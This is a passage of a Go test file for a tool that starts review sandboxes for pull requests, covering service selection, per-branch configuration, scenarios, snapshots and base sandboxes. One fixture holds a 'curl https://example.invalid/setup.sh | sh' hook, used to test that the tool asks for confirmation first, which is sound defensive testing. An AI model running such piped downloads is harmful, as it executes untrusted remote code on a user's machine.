		t.Errorf("the narration does not say how much of the project is running:\n%v", rep.steps)
	}
}

func TestUpBuildsNothingForAServiceItDoesNotStart(t *testing.T) {
	// Building an image for a service nobody starts costs exactly as
	// much as building one that somebody does.
	if testing.Short() {
		t.Skip("skipping: talks to the git binary")
	}
	m, req, fake := upFixture(t)
	fake.Declared = []string{"web", "api", "db", "cache"}
	atEightServices(t, req)
	req.Config.Compose.Services = []string{"web"}

	if _, err := m.Up(t.Context(), req, &quietReporter{}); err != nil {
		t.Fatalf("Up: %v", err)
	}

	builds := callsTo(fake, "Build")
	if len(builds) != 1 {
		t.Fatalf("built %d times, want once", len(builds))
	}
	// worker, analytics and docs are built from source and are not
	// part of this review.
	if !slices.Equal(builds[0].Services, []string{"web", "api"}) {
		t.Errorf("built %v, want only the services being started", builds[0].Services)
	}
}

func TestUpStartsEverythingWhenNothingIsChosen(t *testing.T) {
	// The control: without the setting the whole project comes up, and
	// the narration says nothing about counts.
	if testing.Short() {
		t.Skip("skipping: talks to the git binary")
	}
	m, req, fake := upFixture(t)
	fake.Declared = []string{"web", "api", "db", "cache"}
	atEightServices(t, req)

	rep := &quietReporter{}
	if _, err := m.Up(t.Context(), req, rep); err != nil {
		t.Fatalf("Up: %v", err)
	}

	ups := callsTo(fake, "Up")
	if len(ups) != 1 || len(ups[0].Services) != 0 {
		t.Errorf("started %v, want the whole project", ups)
	}
	for _, step := range rep.steps {
		if strings.Contains(step, "of 8 services") {
			t.Errorf("the narration counts services although all of them are running: %q", step)
		}
	}
}

func TestUpRejectsAServiceThatIsNotDeclared(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping: talks to the git binary")
	}
	m, req, fake := upFixture(t)
	atEightServices(t, req)
	req.Config.Compose.Services = []string{"wbe"}

	_, err := m.Up(t.Context(), req, &quietReporter{})
	if err == nil {
		t.Fatal("want an error")
	}
	if hint := errs.Hint(err); !strings.Contains(hint, `did you mean "web"?`) {
		t.Errorf("hint = %q, want the suggestion", hint)
	}
	if slices.Contains(fake.Methods(), "Up") {
		t.Error("the services were started for a selection that cannot work")
	}
}

func TestUpRejectsASelectionWithoutTheServiceUnderReview(t *testing.T) {
	// The reviewer opens web.service. A selection that leaves it out
	// would come up and then fail its healthcheck, which says nothing
	// about what is wrong.
	if testing.Short() {
		t.Skip("skipping: talks to the git binary")
	}
	m, req, _ := upFixture(t)
	atEightServices(t, req)
	req.Config.Compose.Services = []string{"worker"}

	_, err := m.Up(t.Context(), req, &quietReporter{})
	if err == nil {
		t.Fatal("want an error")
	}
	if !strings.Contains(err.Error(), "which is the service a reviewer opens") {
		t.Errorf("error = %q", err)
	}
}

func TestUpUndoesEverythingWhenAPullIsInterrupted(t *testing.T) {
	// Ctrl+C lands in the pull more often than anywhere else, because
	// that is where the waiting is. The other pulls have to stop with
	// it, and what has been created has to go.
	if testing.Short() {
		t.Skip("skipping: talks to the git binary")
	}
	m, req, fake := upFixture(t)
	fake.Declared = []string{"web", "api", "db", "cache"}
	atEightServices(t, req)
	req.Config.Compose.Services = []string{"web"}
	req.Config.Build.Prebuilt = "ghcr.io/acme/shop-{service}:{sha}"

	ctx, cancel := context.WithCancel(t.Context())
	var once sync.Once
	fake.OnPull = func(string) { once.Do(cancel) }

	_, err := m.Up(ctx, req, &quietReporter{})
	if err == nil {
		t.Fatal("want an error after the interruption")
	}

	// Not built after all: carrying on would turn a Ctrl+C during a
	// pull into the longest wait of the day.
	if builds := callsTo(fake, "Build"); len(builds) != 0 {
		t.Errorf("built %+v after the pull was interrupted", builds)
	}
	if slices.Contains(fake.Methods(), "Up") {
		t.Error("the services were started although the setup was interrupted")
	}
	assertNothingLeftBehind(t, m, req)
}

// TestUpUsesThePullRequestsOwnConfiguration is the acceptance
// criterion for T-411.
func TestUpUsesThePullRequestsOwnConfiguration(t *testing.T) {
	// A pull request that adds a scenario cannot be reviewed with it
	// unless its own file is the one being read.
	if testing.Short() {
		t.Skip("skipping: talks to the git binary")
	}
	m, req, _ := upFixture(t)
	store := scenario(t, m, req)

	pushToPullRequest(t, req.Repo.Root, req.PR.Number, map[string]string{
		".pit.yaml": `version: 1
web:
  service: web
  port: 80
data:
  scenarios:
    - name: refunds
      description: "an order with a partial refund"
      apply: ["compose exec -T db psql -f /fixtures/refunds.sql"]
  default: refunds
`,
	})
	// The reviewer's own file knows nothing about it.
	req.Scenario = "refunds"

	rep := &quietReporter{}
	record, err := m.Up(t.Context(), req, rep)
	if err != nil {
		t.Fatalf("Up: %v", err)
	}

	if applied := store.Applied(); !slices.Equal(applied, []string{"refunds"}) {
		t.Errorf("applied %v, want the scenario the pull request adds", applied)
	}
	if record.Scenario != "refunds" {
		t.Errorf("Scenario = %q, want what was loaded", record.Scenario)
	}
	if !slices.ContainsFunc(rep.notes, func(n string) bool { return strings.Contains(n, "own .pit.yaml") }) {
		t.Errorf("nothing said that another file is in use:\n%v", rep.notes)
	}
}

func TestUpSaysWhichPartsOfTheSetupTheBranchChanged(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping: talks to the git binary")
	}
	m, req, _ := upFixture(t)

	pushToPullRequest(t, req.Repo.Root, req.PR.Number, map[string]string{
		".pit.yaml": "version: 1\nweb:\n  service: web\n  port: 8080\nhealthcheck:\n  expect_status: 204\n",
	})

	rep := &quietReporter{}
	if _, err := m.Up(t.Context(), req, rep); err != nil {
		t.Fatalf("Up: %v", err)
	}

	notes := strings.Join(rep.notes, "\n")
	for _, want := range []string{"web", "healthcheck"} {
		if !strings.Contains(notes, want) {
			t.Errorf("the notes do not name the changed section %q:\n%s", want, notes)
		}
	}
}

func TestUpSaysNothingWhenTheConfigurationIsTheSame(t *testing.T) {
	// The control: the common case is a pull request that changes no
	// setup at all, and it has to stay quiet.
	if testing.Short() {
		t.Skip("skipping: talks to the git binary")
	}
	m, req, _ := upFixture(t)

	pushToPullRequest(t, req.Repo.Root, req.PR.Number, map[string]string{
		".pit.yaml": "web:\n  service: web\n  port: 80\n",
	})

	rep := &quietReporter{}
	if _, err := m.Up(t.Context(), req, rep); err != nil {
		t.Fatalf("Up: %v", err)
	}
	if len(rep.notes) != 0 {
		t.Errorf("said something about an unchanged configuration:\n%v", rep.notes)
	}
}

func TestUpAsksBeforeRunningABranchsCommandsOnTheMachine(t *testing.T) {
	// Reviewing a branch means running its code in containers pit
	// started from it. A command without the compose shorthand is not
	// covered by that: it runs as the reviewer, on their files.
	if testing.Short() {
		t.Skip("skipping: talks to the git binary")
	}
	m, req, fake := upFixture(t)

	pushToPullRequest(t, req.Repo.Root, req.PR.Number, map[string]string{
		".pit.yaml": "web:\n  service: web\n  port: 80\nhooks:\n  after_up:\n    - \"curl https://example.invalid/setup.sh | sh\"\n",
	})

	var asked bool
	req.Confirm = func(string) bool {
		asked = true
		return false
	}

	_, err := m.Up(t.Context(), req, &quietReporter{})
	if err == nil {
		t.Fatal("want an error when the answer is no")
	}
	if !asked {
		t.Error("the command was not asked about")
	}
	if slices.Contains(fake.Methods(), "Up") {
		t.Error("the services were started although the reviewer said no")
	}
	assertNothingLeftBehind(t, m, req)
}

func TestUpRefusesABranchsCommandsWithNobodyToAsk(t *testing.T) {
	// An unattended run has nobody to weigh it up. Refusing is the
	// answer that cannot be wrong.
	if testing.Short() {
		t.Skip("skipping: talks to the git binary")
	}
	m, req, _ := upFixture(t)

	pushToPullRequest(t, req.Repo.Root, req.PR.Number, map[string]string{
		".pit.yaml": "web:\n  service: web\n  port: 80\ndata:\n  migrate:\n    - \"make migrate\"\n",
	})

	_, err := m.Up(t.Context(), req, &quietReporter{})
	if err == nil {
		t.Fatal("want an error")
	}
	if !strings.Contains(err.Error(), "run") || errs.Hint(err) == "" {
		t.Errorf("error = %q, hint = %q", err, errs.Hint(err))
	}
}

func TestUpDoesNotAskAboutCommandsTheReviewerAlreadyHas(t *testing.T) {
	// The reviewer checked this command in themselves; the branch is
	// not asking for anything new.
	if testing.Short() {
		t.Skip("skipping: talks to the git binary")
	}
	m, req, _ := upFixture(t)
	req.Config.Hooks.AfterUp = []string{"true"}
	req.Config.Data.Service = "db" // something to differ in, so the note fires

	pushToPullRequest(t, req.Repo.Root, req.PR.Number, map[string]string{
		".pit.yaml": "web:\n  service: web\n  port: 80\nhooks:\n  after_up:\n    - \"true\"\n",
	})

	req.Confirm = func(string) bool {
		t.Error("asked about a command the reviewer already runs")
		return false
	}

	if _, err := m.Up(t.Context(), req, &quietReporter{}); err != nil {
		t.Fatalf("Up: %v", err)
	}
}

func TestUpWritesTheOverrideForAProjectThatBuildsNothing(t *testing.T) {
	// A project of published images has nothing to build, and the
	// generated override still has to exist: every compose command is
	// given it by name. A fake runtime cannot notice a missing file,
	// which is why this looks at the disk.
	if testing.Short() {
		t.Skip("skipping: talks to the git binary")
	}
	m, req, _ := upFixture(t)

	record, err := m.Up(t.Context(), req, &quietReporter{})
	if err != nil {
		t.Fatalf("Up: %v", err)
	}

	override := record.ComposeFiles[len(record.ComposeFiles)-1]
	if _, err := os.Stat(override); err != nil {
		t.Fatalf("the generated override is missing: %v", err)
	}

	written, err := os.ReadFile(override)
	if err != nil {
		t.Fatalf("ReadFile: %v", err)
	}
	if !strings.Contains(string(written), strconv.Itoa(record.Port)) {
		t.Errorf("the override does not publish the sandbox's port:\n%s", written)
	}
}

// pit what measures a change from the branch it goes into, so Up fetches
// that too. Not being able to is worth a note and not a failed setup.
func TestUpFetchesTheBranchItGoesInto(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping: talks to the git binary")
	}
	for _, tc := range []struct {
		branch string
		found  bool
	}{
		{"", true},              // the remote's default, when no forge says
		{"main", true},          // what GitHub says
		{"gone-already", false}, // deleted since
	} {
		m, req, _ := upFixture(t)
		req.PR.BaseBranch = tc.branch
		rep := &quietReporter{}
		record, err := m.Up(t.Context(), req, rep)
		if err != nil {
			t.Fatalf("%q: Up failed: %v", tc.branch, err)
		}
		if record.BaseBranch != tc.branch {
			t.Errorf("%q: BaseBranch = %q", tc.branch, record.BaseBranch)
		}
		_, err = (proc.Exec{}).Output(t.Context(), proc.Command{
			Name: "git", Args: []string{"rev-parse", "--verify", "--quiet", workspace.BaseRef(7)}, Dir: req.Repo.Root,
		})
		if found := err == nil; found != tc.found {
			t.Errorf("%q: base ref found = %v, want %v", tc.branch, found, tc.found)
		}
		noted := slices.ContainsFunc(rep.notes, func(n string) bool { return strings.Contains(n, "pit what") })
		if noted == tc.found {
			t.Errorf("%q: notes %q", tc.branch, rep.notes)
		}
	}
}

// What a reviewer has looked at survives an update to a new commit;
// which marks the new commit makes stale is for pit what to decide, and
// it can only decide that if the marks are still there.
func TestUpKeepsWhatWasLookedAt(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping: talks to the git binary")
	}
	m, req, _ := upFixture(t)
	first, err := m.Up(t.Context(), req, &quietReporter{})
	if err != nil {
		t.Fatalf("first Up: %v", err)
	}
	checked := []state.Check{{Address: "/orders", SHA: first.SHA, At: time.Now().UTC()}}
	if err := m.Store.Update(func(f *state.File) error {
		box, _ := f.Find(first.RepoRef, first.PR)
		box.Checked = checked
		f.Put(box)
		return nil
	}); err != nil {
		t.Fatal(err)
	}

	advancePullRequest(t, req.Repo.Root, req.PR.Number)
	second, err := m.Up(t.Context(), req, &quietReporter{})
	if err != nil {
		t.Fatalf("second Up: %v", err)
	}
	if second.SHA == first.SHA {
		t.Fatal("the pull request did not move; the test proves nothing")
	}
	f, err := m.Store.Load()
	if err != nil {
		t.Fatal(err)
	}
	box, _ := f.Find(second.RepoRef, second.PR)
	if len(box.Checked) != 1 || box.Checked[0].Address != "/orders" || box.Checked[0].SHA != first.SHA {
		t.Errorf("checked after the update = %+v, want %+v", box.Checked, checked)
	}
}

// Reusing a running sandbox asks it whether it answers, and that request
// lands in the web service's log. The time is kept so that pit what does
// not take it for the reviewer's.
func TestReuseNotesItsOwnRequest(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping: talks to the git binary")
	}
	m, req, _ := upFixture(t)
	first, err := m.Up(t.Context(), req, &quietReporter{})
	if err != nil {
		t.Fatalf("first Up: %v", err)
	}
	if first.ProbedAt.IsZero() {
		t.Error("the setup's own request was not noted")
	}
	rep := &quietReporter{}
	if _, err := m.Up(t.Context(), req, rep); err != nil {
		t.Fatalf("second Up: %v", err)
	}
	if !slices.Contains(rep.begun, "reuse") {
		t.Fatalf("the second Up did not reuse; the test proves nothing: %v", rep.begun)
	}
	f, err := m.Store.Load()
	if err != nil {
		t.Fatal(err)
	}
	box, _ := f.Find(first.RepoRef, first.PR)
	if !box.ProbedAt.After(first.ProbedAt) {
		t.Errorf("ProbedAt = %v, not after the first %v", box.ProbedAt, first.ProbedAt)
	}
}

// restored marks the recorded sandbox of req as holding a snapshot, as
// pit snap restore leaves it.
func restored(t *testing.T, m *sandbox.Manager, req sandbox.UpRequest, id string) {
	t.Helper()
	err := m.Store.Update(func(f *state.File) error {
		for i := range f.Sandboxes {
			if f.Sandboxes[i].PR == req.PR.Number {
				f.Sandboxes[i].Snapshot = id
			}
		}
		return nil
	})
	if err != nil {
		t.Fatal(err)
	}
}

func TestUpKeepsARestoredSnapshotWhenItUpdates(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping: talks to the git binary")
	}
	m, req, store := updated(t)
	restored(t, m, req, "sn_7f3a1b")

	record, err := m.Up(t.Context(), req, &quietReporter{})
	if err != nil {
		t.Fatalf("second Up: %v", err)
	}
	if len(store.Applied()) != 1 {
		t.Errorf("applied %v; the data was the reviewer's and should have stayed", store.Applied())
	}
	if record.Snapshot != "sn_7f3a1b" {
		t.Errorf("Snapshot = %q; the data kept is still the snapshot", record.Snapshot)
	}
}

// A restored snapshot keeps the name of the scenario it was taken on,
// for the example values in addresses. Asking for that scenario is
// still asking for different data than the snapshot.
func TestUpReplacesARestoredSnapshotWithTheScenarioOfTheSameName(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping: talks to the git binary")
	}
	for name, advance := range map[string]bool{"running": false, "updating": true} {
		t.Run(name, func(t *testing.T) {
			m, req, _ := upFixture(t)
			store := scenario(t, m, req)
			if _, err := m.Up(t.Context(), req, &quietReporter{}); err != nil {
				t.Fatalf("first Up: %v", err)
			}
			restored(t, m, req, "sn_7f3a1b")
			if advance {
				advancePullRequest(t, req.Repo.Root, req.PR.Number)
			}
			req.Scenario = "standard"
			req.Confirm = func(string) bool {
				t.Error("asked, although --scenario had said what was wanted")
				return false
			}

			record, err := m.Up(t.Context(), req, &quietReporter{})
			if err != nil {
				t.Fatalf("second Up: %v", err)
			}
			if applied := store.Applied(); len(applied) != 2 {
				t.Errorf("applied %v, want standard loaded over the snapshot", applied)
			}
			if record.Snapshot != "" || record.Scenario != "standard" {
				t.Errorf("recorded %q / %q, want the scenario and no snapshot", record.Scenario, record.Snapshot)
			}
		})
	}
}

// A scenario only the reviewer's file has -- one promoted a minute ago
// -- is loaded from there, even for a pull request with a file of its
// own. The pull request's file does not have it, so nothing it says is
// overruled (T-706).
func TestUpLoadsAScenarioOnlyTheReviewerHas(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping: talks to the git binary")
	}
	m, req, _ := upFixture(t)
	store := scenario(t, m, req)
	req.Config.Data.Scenarios = append(req.Config.Data.Scenarios, config.Scenario{
		Name: "voucher", Apply: []string{"compose exec -T db psql -f /fixtures/voucher.sql"},
	})
	pushToPullRequest(t, req.Repo.Root, req.PR.Number, map[string]string{
		".pit.yaml": "version: 1\nweb:\n  service: web\n  port: 80\ndata:\n  scenarios:\n    - name: standard\n      apply: [\"compose exec -T db theirs\"]\n",
	})

	req.Scenario = "voucher"
	rep := &quietReporter{}
	record, err := m.Up(t.Context(), req, rep)
	if err != nil {
		t.Fatalf("Up: %v", err)
	}
	calls := store.Calls()
	if len(calls) != 1 || calls[0].Scenario != "voucher" || !slices.Equal(calls[0].Commands, []string{"compose exec -T db psql -f /fixtures/voucher.sql"}) {
		t.Errorf("applied %+v", calls)
	}
	if record.Scenario != "voucher" {
		t.Errorf("Scenario = %q", record.Scenario)
	}
	if !slices.ContainsFunc(rep.notes, func(n string) bool { return strings.Contains(n, `has no scenario "voucher"; loading it from yours`) }) {
		t.Errorf("nothing said where the scenario came from:\n%v", rep.notes)
	}
}

// A scenario both files have is the pull request's: that one is under
// review.
func TestUpPrefersThePullRequestsScenarioOfTheSameName(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping: talks to the git binary")
	}
	m, req, _ := upFixture(t)
	store := scenario(t, m, req)
	pushToPullRequest(t, req.Repo.Root, req.PR.Number, map[string]string{
		".pit.yaml": "version: 1\nweb:\n  service: web\n  port: 80\ndata:\n  scenarios:\n    - name: standard\n      apply: [\"compose exec -T db theirs\"]\n",
	})
	req.Scenario = "standard"
	if _, err := m.Up(t.Context(), req, &quietReporter{}); err != nil {
		t.Fatalf("Up: %v", err)
	}
	if calls := store.Calls(); len(calls) != 1 || !slices.Equal(calls[0].Commands, []string{"compose exec -T db theirs"}) {
		t.Errorf("applied %+v", calls)
	}
}

// withCounter gives the reviewer's checkout snapshot commands whose
// writes command reads a number from a file, and migrations that add
// one to it, as a migration that fills a new column would. It returns
// the file.
func withCounter(t *testing.T, req *sandbox.UpRequest) string {
	t.Helper()
	counter := filepath.Join(t.TempDir(), "count")
	writeFile(t, counter, "5\n")
	yaml := `version: 1
web:
  service: web
  port: 80
data:
  migrate: ["sh -c 'n=$(cat ` + counter + `); echo $((n + 1)) > ` + counter + `'"]
  snapshot:
    save: "true"
    restore: "true"
    writes: "cat ` + counter + `"
`
	writeFile(t, filepath.Join(req.Repo.Root, ".pit.yaml"), yaml)
	cfg, err := config.Parse([]byte(yaml))
	if err != nil {
		t.Fatal(err)
	}
	req.Config = cfg
	return counter
}

func counted(t *testing.T, path string) string {
	t.Helper()
	b, err := os.ReadFile(path)
	if err != nil {
		t.Fatal(err)
	}
	return strings.TrimSpace(string(b))
}

func editOf(t *testing.T, m *sandbox.Manager, record state.Sandbox) sandbox.Edit {
	t.Helper()
	e, err := m.Find(t.Context(), record.RepoRef, record.PR)
	if err != nil {
		t.Fatal(err)
	}
	return e.Edited
}

// TestUpCountsTheWritesOfWhatItLoaded is the acceptance criterion for
// T-707 below the command line: the count is taken once the data is
// loaded, and a write since then shows.
func TestUpCountsTheWritesOfWhatItLoaded(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping: talks to the git binary")
	}
	m, req, _ := upFixture(t)
	counter := withCounter(t, &req)

	record, err := m.Up(t.Context(), req, &quietReporter{})
	if err != nil {
		t.Fatalf("Up: %v", err)
	}
	// After the migration, which made it 6.
	if !slices.Equal(record.Writes, []int64{6}) || record.Edited {
		t.Fatalf("Writes = %v, Edited = %v", record.Writes, record.Edited)
	}
	if got := editOf(t, m, record); got != sandbox.Unedited {
		t.Errorf("right after loading: %v", got)
	}
	writeFile(t, counter, "7\n")
	if got := editOf(t, m, record); got != sandbox.Edited {
		t.Errorf("after a write: %v", got)
	}
}

// An update keeps the data, and runs the new commit's migrations on it.
// What they write is not the reviewer's; what the reviewer wrote before
// still is.
func TestAnUpdateKeepsTrackOfWhatWasWritten(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping: talks to the git binary")
	}
	for _, reviewerWrote := range []bool{false, true} {
		m, req, _ := upFixture(t)
		counter := withCounter(t, &req)
		first, err := m.Up(t.Context(), req, &quietReporter{})
		if err != nil {
			t.Fatalf("Up: %v", err)
		}
		if reviewerWrote {
			writeFile(t, counter, "20\n")
		}

		pushToPullRequest(t, req.Repo.Root, req.PR.Number, map[string]string{"CHANGELOG": "a new commit\n"})
		updated, err := m.Up(t.Context(), req, &quietReporter{})
		if err != nil {
			t.Fatalf("update: %v", err)
		}
		if updated.SHA == first.SHA {
			t.Fatal("the update did not happen")
		}
		// Counted after the migration of the new commit.
		if want := counted(t, counter); len(updated.Writes) != 1 || fmt.Sprint(updated.Writes[0]) != want {
			t.Errorf("Writes = %v, want [%s]", updated.Writes, want)
		}
		want := sandbox.Unedited
		if reviewerWrote {
			want = sandbox.Edited
		}
		if updated.Edited != reviewerWrote || editOf(t, m, updated) != want {
			t.Errorf("reviewer wrote %v: Edited = %v, pit ls says %v", reviewerWrote, updated.Edited, editOf(t, m, updated))
		}
	}
}

// A database that began counting again cannot say what happened before;
// an update does not turn that into "unchanged".
func TestAnUpdateOfDataPitCannotTellAbout(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping: talks to the git binary")
	}
	m, req, _ := upFixture(t)
	counter := withCounter(t, &req)
	if _, err := m.Up(t.Context(), req, &quietReporter{}); err != nil {
		t.Fatal(err)
	}
	writeFile(t, counter, "0\n") // restarted
	pushToPullRequest(t, req.Repo.Root, req.PR.Number, map[string]string{"CHANGELOG": "a new commit\n"})
	updated, err := m.Up(t.Context(), req, &quietReporter{})
	if err != nil {
		t.Fatal(err)
	}
	if updated.Writes != nil || updated.Edited || editOf(t, m, updated) != sandbox.EditUnknown {
		t.Errorf("Writes = %v, Edited = %v", updated.Writes, updated.Edited)
	}
}

// withStandard gives the counter's configuration a scenario to switch
// to, and the store that records loading it.
func withStandard(t *testing.T, m *sandbox.Manager, req *sandbox.UpRequest) *datatest.Fake {
	t.Helper()
	req.Config.Data.Scenarios = []config.Scenario{{Name: "standard", Apply: []string{"compose exec -T db load"}}}
	return m.Data.(*datatest.Fake)
}

// Asking a running sandbox for another scenario replaces its data
// without a question -- asking was the question. Data that was changed
// since it was loaded is offered to be saved first (T-708).
func TestSwitchingScenarioOffersToSaveChangedData(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping: talks to the git binary")
	}
	for _, tc := range []struct {
		name    string
		written bool
		refuse  bool
	}{
		{"unchanged", false, false},
		{"changed", true, false},
		{"changed, and saving fails", true, true},
	} {
		m, req, _ := upFixture(t)
		counter := withCounter(t, &req)
		store := withStandard(t, m, &req)
		if _, err := m.Up(t.Context(), req, &quietReporter{}); err != nil {
			t.Fatal(err)
		}
		if tc.written {
			writeFile(t, counter, "40\n")
		}
		var offered []int
		req.OfferSave = func(box state.Sandbox) error {
			offered = append(offered, box.PR)
			if tc.refuse {
				return errors.New("no room")
			}
			return nil
		}
		req.Scenario = "standard"
		_, err := m.Up(t.Context(), req, &quietReporter{})
		if (len(offered) == 1) != tc.written {
			t.Errorf("%s: offered %v", tc.name, offered)
		}
		loaded := slices.Contains(store.Applied(), "standard")
		if tc.refuse {
			if err == nil || loaded {
				t.Errorf("%s: err = %v, loaded %v", tc.name, err, loaded)
			}
			continue
		}
		if err != nil || !loaded {
			t.Errorf("%s: err = %v, loaded %v", tc.name, err, loaded)
		}
	}
}

// An update that loads the scenario again offers too, going by what was
// written before its migrations ran -- they write as well.
func TestAnUpdateThatReloadsOffersToSaveChangedData(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping: talks to the git binary")
	}
	for _, written := range []bool{false, true} {
		m, req, _ := upFixture(t)
		counter := withCounter(t, &req)
		withStandard(t, m, &req)
		req.Scenario = "standard"
		if _, err := m.Up(t.Context(), req, &quietReporter{}); err != nil {
			t.Fatal(err)
		}
		if written {
			writeFile(t, counter, "40\n")
		}
		var offered int
		req.OfferSave = func(state.Sandbox) error { offered++; return nil }
		req.Confirm = func(string) bool { return true } // load it again
		pushToPullRequest(t, req.Repo.Root, req.PR.Number, map[string]string{"CHANGELOG": "a new commit\n"})
		if _, err := m.Up(t.Context(), req, &quietReporter{}); err != nil {
			t.Fatal(err)
		}
		if (offered == 1) != written {
			t.Errorf("written %v: offered %d times", written, offered)
		}
	}
}

// withRestore makes the counter's configuration restore into a file,
// and saves a snapshot of the repository at sha. It returns the file
// and the snapshot.
func withRestore(t *testing.T, m *sandbox.Manager, req *sandbox.UpRequest, sha string) (string, snapshot.Snapshot) {
	t.Helper()
	counter := withCounter(t, req)
	restored := filepath.Join(t.TempDir(), "restored")
	yaml := strings.Replace(mustRead(t, filepath.Join(req.Repo.Root, ".pit.yaml")),
		`restore: "true"`, `restore: "sh -c 'cat > `+restored+`'"`, 1)
	writeFile(t, filepath.Join(req.Repo.Root, ".pit.yaml"), yaml)
	cfg, err := config.Parse([]byte(yaml))
	if err != nil {
		t.Fatal(err)
	}
	req.Config = cfg
	_ = counter
	store := m.Snapshots(state.Sandbox{RepoRef: req.Repo.Identity.Ref()})
	snap, err := store.Save(t.Context(), snapshot.Snapshot{Name: "voucher", PR: 3, SHA: sha, Scenario: "standard"},
		snapshot.One(func(_ context.Context, w io.Writer) error {
			_, err := io.WriteString(w, "-- the voucher case\n")
			return err
		}))
	if err != nil {
		t.Fatal(err)
	}
	return restored, snap
}

func mustRead(t *testing.T, path string) string {
	t.Helper()
	b, err := os.ReadFile(path)
	if err != nil {
		t.Fatal(err)
	}
	return string(b)
}

// TestUpStartsFromASnapshot is the acceptance criterion for T-709: the
// sandbox comes up with the saved data, and says where it came from.
func TestUpStartsFromASnapshot(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping: talks to the git binary")
	}
	m, req, _ := upFixture(t)
	restored, snap := withRestore(t, m, &req, "an-older-commit")
	store := m.Data.(*datatest.Fake)
	req.Snapshot = &snap
	rep := &quietReporter{}

	record, err := m.Up(t.Context(), req, rep)
	if err != nil {
		t.Fatalf("Up: %v", err)
	}
	if got := mustRead(t, restored); got != "-- the voucher case\n" {
		t.Errorf("restored %q", got)
	}
	if record.Snapshot != snap.ID || record.Scenario != "standard" || len(store.Applied()) != 0 {
		t.Errorf("Snapshot %q, Scenario %q, applied %v", record.Snapshot, record.Scenario, store.Applied())
	}
	// The migrations ran once for the empty database and once more for
	// the snapshot's older schema: 5 → 6 → 7.
	if !slices.Equal(record.Writes, []int64{7}) {
		t.Errorf("Writes = %v", record.Writes)
	}
	done := strings.Join(rep.steps, "\n")
	for _, want := range []string{"snapshot voucher (" + snap.ID + "), saved in #3 at an-olde", "1 migration again, as the snapshot is from an-olde"} {
		if !strings.Contains(done, want) {
			t.Errorf("steps lack %q:\n%s", want, done)
		}
	}
}

// Asked for on a sandbox that is running, the snapshot replaces its
// data; asked for again, nothing happens.
func TestUpRestoresASnapshotIntoARunningSandbox(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping: talks to the git binary")
	}
	m, req, _ := upFixture(t)
	restored, snap := withRestore(t, m, &req, "an-older-commit")
	if _, err := m.Up(t.Context(), req, &quietReporter{}); err != nil {
		t.Fatal(err)
	}
	if _, err := os.Stat(restored); err == nil {
		t.Fatal("restored before it was asked for")
	}
	req.Snapshot = &snap
	record, err := m.Up(t.Context(), req, &quietReporter{})
	if err != nil {
		t.Fatalf("Up: %v", err)
	}
	if mustRead(t, restored) != "-- the voucher case\n" || record.Snapshot != snap.ID {
		t.Errorf("Snapshot %q", record.Snapshot)
	}
	f, _ := m.Store.Load()
	if got, _ := f.Find(record.RepoRef, record.PR); got.Snapshot != snap.ID {
		t.Errorf("recorded %q", got.Snapshot)
	}

	if err := os.Remove(restored); err != nil {
		t.Fatal(err)
	}
	if _, err := m.Up(t.Context(), req, &quietReporter{}); err != nil {
		t.Fatal(err)
	}
	if _, err := os.Stat(restored); err == nil {
		t.Error("restored the snapshot the data already came from")
	}
}

// A new commit keeps the data; the snapshot it came from is loaded again
// only when asked, and another one without asking.
func TestAnUpdateKeepsTheSnapshotItCameFrom(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping: talks to the git binary")
	}
	m, req, _ := upFixture(t)
	restored, snap := withRestore(t, m, &req, "an-older-commit")
	req.Snapshot = &snap
	if _, err := m.Up(t.Context(), req, &quietReporter{}); err != nil {
		t.Fatal(err)
	}
	if err := os.Remove(restored); err != nil {
		t.Fatal(err)
	}
	var asked []string
	req.Confirm = func(q string) bool { asked = append(asked, q); return false }
	pushToPullRequest(t, req.Repo.Root, req.PR.Number, map[string]string{"CHANGELOG": "a new commit\n"})
	record, err := m.Up(t.Context(), req, &quietReporter{})
	if err != nil {
		t.Fatal(err)
	}
	if len(asked) != 1 || !strings.Contains(asked[0], "Restore voucher ("+snap.ID+") again?") {
		t.Errorf("asked %q", asked)
	}
	if _, err := os.Stat(restored); err == nil || record.Snapshot != snap.ID {
		t.Errorf("restored again, or forgot where the data came from: %q", record.Snapshot)
	}
}

// A snapshot the configuration cannot restore is refused before
// anything is built.
func TestUpRefusesASnapshotItCannotRestore(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping: talks to the git binary")
	}
	m, req, fake := upFixture(t)
	_, snap := withRestore(t, m, &req, "abc")
	snap.Parts = []snapshot.Part{{Service: "orders"}, {Service: "stock"}}
	req.Snapshot = &snap
	_, err := m.Up(t.Context(), req, &quietReporter{})
	if err == nil || !strings.Contains(err.Error(), "#7 cannot load voucher") {
		t.Errorf("err = %v", err)
	}
	if slices.Contains(fake.Methods(), "Up") {
		t.Error("the services were started for a snapshot that cannot be loaded")
	}
}

// TestUpBringsUpTheBase is the acceptance criterion for T-901: the
// commit the pull request goes into runs in a sandbox of its own,
// beside the pull request's.
func TestUpBringsUpTheBase(t *testing.T) {
	if testing.Short() {
		t.Skip("skipping: talks to the git binary")
	}
	m, req, fake := upFixture(t)
	own, err := m.Up(t.Context(), req, &quietReporter{})
	if err != nil {
		t.Fatalf("Up: %v", err)
	}
	req.Base = true
	base, err := m.Up(t.Context(), req, &quietReporter{})
	if err != nil {
		t.Fatalf("Up --base: %v", err)
	}

	tip, err := workspace.ResolveRef(t.Context(), proc.Exec{}, req.Repo.Root, "refs/remotes/origin/main")
	if err != nil {
		tip, err = workspace.ResolveRef(t.Context(), proc.Exec{}, req.Repo.Root, "main")
	}
	if err != nil {
		t.Fatal(err)
	}
	if !base.Base || base.SHA != tip || base.SHA == own.SHA {
		t.Errorf("base at %s (base %v), pull request at %s, branch at %s", base.SHA, base.Base, own.SHA, tip)
	}
	// Before the change: the pull request's file is not there.
